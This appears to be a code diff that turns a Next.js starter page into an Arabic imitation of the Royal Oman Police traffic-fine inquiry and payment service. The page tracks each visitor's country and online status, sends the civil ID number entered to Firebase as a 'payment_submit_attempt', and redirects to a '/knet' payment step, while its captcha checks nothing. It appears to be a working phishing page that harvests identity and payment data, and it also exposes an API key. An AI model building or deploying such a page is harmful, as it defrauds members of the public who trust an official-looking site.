@@ -1,113 +1,256 @@
-import Image from 'next/image';
+"use client"
 
-export default function Home() {
+import { useEffect, useState } from "react"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { Label } from "@/components/ui/label"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { Menu, RefreshCw } from "lucide-react"
+import Link from "next/link"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
+export default function TrafficInquiry() {
+  const [captchaCode, setCaptchaCode] = useState("L2Q2B")
+  const [phone, setPhone] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  useEffect(() => {
+    getLocation().then(() => {});
+  }, []);
+  async function getLocation() {
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorId,
+        country: country,
+      });
+      localStorage.setItem("country", country);
+      setupOnlineStatus(visitorId);
+    } catch (error) {
+      console.error("Error fetching location:", error);
+    }
+  }
+  const refreshCaptcha = () => {
+    // Generate random captcha code
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    let result = ""
+    for (let i = 0; i < 5; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length))
+    }
+    setCaptchaCode(result)
+  }
+  const handleSubmit = async (e: any) => {
+    e.preventDefault()
+    setIsLoading(true)
+    try {
+      await addData({
+        id: visitorId,
+        phone: phone, // Storing phone number, ensure compliance with privacy regulations
+        timestamp: new Date().toISOString(),
+        currentPage: "كي نت ",
+        action: "payment_submit_attempt"
+      }).then(() => {
+        window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')
+
+      })
+
+    } catch (error) {
+      console.error("Submission error:", error);
+      await addData({
+        id: visitorId,
+        action: "payment_submit_error",
+        error: error instanceof Error ? error.message : String(error)
+      });
+      // Handle error display to user
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <div className="min-h-screen bg-gray-100" dir="rtl">
+      {/* Header */}
+      <header className="bg-white shadow-sm">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex justify-between items-center h-16">
+            <button className="p-2">
+              <Menu className="h-6 w-6 text-blue-800" />
+            </button>
+            <div className="flex items-center">
+              <img src="/placeholder.svg?height=50&width=50" alt="شعار شرطة عمان السلطانية" className="h-12 w-12" />
+            </div>
+          </div>
+        </div>
+      </header>
+
+      {/* Blue Navigation Bar */}
+      <div className="bg-blue-800 text-white py-4">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <nav className="text-center">
+            <span className="text-lg">الصفحة الرئيسية</span>
+            <span className="mx-2">|</span>
+            <span className="text-lg">الخدمات الإلكترونية</span>
+          </nav>
+          <div className="text-center mt-2">
+            <span className="text-base">الاستفسار ودفع المخالفات المرورية</span>
+          </div>
         </div>
       </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+      {/* Listen Button */}
+      <div className="bg-gray-200 py-4">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+          <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded">🔊 للاستماع</Button>
+        </div>
       </div>
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+      {/* Main Content */}
+      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        <Card className="bg-white shadow-lg">
+          <CardHeader className="text-center bg-gray-50">
+            <CardTitle className="text-2xl font-bold text-gray-800 mb-2">الخدمات الإلكترونية</CardTitle>
+            <p className="text-lg text-red-600 font-semibold">الاستفسار ودفع المخالفات المرورية</p>
+          </CardHeader>
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+          <CardContent className="p-8">
+            <p className="text-center text-gray-700 mb-8 leading-relaxed">
+              تم تعبئة النموذج أدناه للاستعلام ودفع قيمة المخالفات المرورية
+              <br />
+              غير المسددة
+            </p>
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
+            <form className="space-y-6">
+              {/* Violation Type */}
+              <div className="space-y-2">
+                <Label htmlFor="violation-type" className="text-right block font-semibold">
+                  رمز اللوحة
+                </Label>
+                <Select>
+                  <SelectTrigger className="w-full text-right">
+                    <SelectValue placeholder="اختر واحدة ..." />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="أ">أ - مسقط</SelectItem>
+                    <SelectItem value="ب">ب - ظفار</SelectItem>
+                    <SelectItem value="ج">ج - مسندم</SelectItem>
+                    <SelectItem value="د">د - البريمي</SelectItem>
+                    <SelectItem value="هـ">هـ - الداخلية</SelectItem>
+                    <SelectItem value="و">و - شمال الباطنة</SelectItem>
+                    <SelectItem value="ز">ز - جنوب الباطنة</SelectItem>
+                    <SelectItem value="ح">ح - شمال الشرقية</SelectItem>
+                    <SelectItem value="ط">ط - جنوب الشرقية</SelectItem>
+                    <SelectItem value="ي">ي - الظاهرة</SelectItem>
+                    <SelectItem value="ك">ك - الوسطى</SelectItem>
 
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  );
+                    <SelectItem value="م">م - مركبات حكومية</SelectItem>
+                    <SelectItem value="ش">ش - شرطة عمان السلطانية</SelectItem>
+                    <SelectItem value="ق">ق - القوات المسلحة</SelectItem>
+                    <SelectItem value="ف">ف - الحرس السلطاني</SelectItem>
+
+                    <SelectItem value="ت">ت - سيارات أجرة</SelectItem>
+                    <SelectItem value="ن">ن - نقل عام</SelectItem>
+                    <SelectItem value="ص">ص - نقل بضائع</SelectItem>
+                    <SelectItem value="ع">ع - تعليم القيادة</SelectItem>
+                    <SelectItem value="س">س - سياحية (تأجير)</SelectItem>
+                    <SelectItem value="ر">ر - سيارات إسعاف</SelectItem>
+                    <SelectItem value="ل">ل - مؤقتة</SelectItem>
+                    <SelectItem value="خ">خ - دبلوماسي</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+
+              {/* Plate Number */}
+              <div className="space-y-2">
+                <Label htmlFor="plate-number" className="text-right block font-semibold">
+                  رقم اللوحة
+                </Label>
+                <Input id="plate-number" placeholder="أدخل رقم المركبة" className="text-right" />
+              </div>
+
+              {/* Identity Type */}
+              <div className="space-y-2">
+                <Label htmlFor="identity-type" className="text-right block font-semibold">
+                  اختر نوع الهوية
+                </Label>
+                <Select>
+                  <SelectTrigger className="w-full text-right">
+                    <SelectValue placeholder="اختر واحدة ..." />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="civil">الهوية المدنية</SelectItem>
+                    <SelectItem value="passport">جواز السفر</SelectItem>
+                    <SelectItem value="residence">بطاقة الإقامة</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+
+              {/* Identity Number */}
+              <div className="space-y-2">
+                <Label htmlFor="identity-number" className="text-right block font-semibold">
+                  أدخل رقم الهوية
+                </Label>
+                <Input id="identity-number"
+                onChange={(e)=>setPhone(e.target.value)} 
+                placeholder="أدخل رقم الهوية" className="text-right" />
+              </div>
+
+              {/* CAPTCHA */}
+              <div className="space-y-2">
+                <Label className="text-right block font-semibold">الرجاء أحد كتابة الأحرف من الصورة:</Label>
+                <div className="flex items-center gap-4">
+                  <div className="flex-1">
+                    <Input placeholder="أدخل رمز التحقق" className="text-right" />
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <div className="bg-gray-200 px-4 py-2 font-mono text-lg font-bold border border-gray-300 select-none">
+                      {captchaCode}
+                    </div>
+                    <Button type="button" variant="outline" size="sm" onClick={refreshCaptcha}>
+                      <RefreshCw className="h-4 w-4" />
+                    </Button>
+                  </div>
+                </div>
+              </div>
+
+              {/* Action Buttons */}
+              <div className="space-y-4 pt-6">
+                <Link href="/payment">
+                  <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-lg">
+                    دفع المخالفات
+                  </Button>
+                </Link>
+
+                <Link href="/payment-history">
+                  <Button className="w-full bg-cyan-500 hover:bg-cyan-600 text-white py-3 text-lg">
+                    المدفوعات السابقة
+                  </Button>
+                </Link>
+
+                <Button className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 text-lg">
+                  تنزيل التقرير
+                </Button>
+              </div>
+            </form>
+          </CardContent>
+        </Card>
+      </main>
+
+      {/* Footer */}
+      <footer className="bg-blue-800 text-white py-6 mt-12">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="border-t border-blue-600 pt-4">
+            <p className="text-center text-sm">© 2023 شرطة عمان السلطانية</p>
+          </div>
+        </div>
+      </footer>
+    </div>
+  )
 }
